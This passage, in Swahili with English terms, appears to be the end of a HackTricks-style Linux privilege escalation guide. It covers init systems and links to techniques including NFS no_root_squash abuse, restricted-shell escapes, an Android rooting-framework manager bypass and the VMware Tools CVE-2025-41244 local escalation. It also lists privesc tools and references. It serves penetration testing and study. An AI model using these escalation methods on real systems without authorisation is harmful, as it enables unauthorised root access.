Kwa upande mwingine, `/etc/init` inahusishwa na Upstart, service management mpya iliyowasilishwa na Ubuntu, ikitumia configuration files kwa kazi za usimamizi wa huduma. Licha ya mabadiliko hadi Upstart, SysVinit scripts bado zinatumiwa pamoja na Upstart kutokana na safu ya mlinganisho katika Upstart.

**systemd** inatokea kama meneja wa kuanzisha na huduma wa kisasa, ikitoa vipengele vya juu kama on-demand daemon starting, automount management, na snapshots za hali ya mfumo. Inaweka faili katika `/usr/lib/systemd/` kwa distribution packages na `/etc/systemd/system/` kwa mabadiliko ya msimamizi, ikirahisisha mchakato wa usimamizi wa mfumo.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks mara nyingi hukata syscall ili kutoa uwezo wa kernel wenye vibali kwa userspace manager. Uthibitishaji dhaifu wa manager (mfano, signature checks zinazotegemea FD-order au mipangilio duni ya password) unaweza kumruhusu app ya ndani kuiga manager na kupanda hadi root kwenye vifaa vilivyo tayari kuwa na root. Jifunze zaidi na maelezo ya exploitation hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa binary path kutoka kwa mistari ya amri za mchakato na kuiendesha na -v chini ya muktadha wenye vibali. Mifumo yenye ruhusa nyingi (mfano, kutumia \S) inaweza kuendana na attacker-staged listeners katika maeneo yanayoweza kuandikwa (mfano, /tmp/httpd), zikisababisha utekelezaji kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na kuona muundo wa jumla unaoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeleo

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
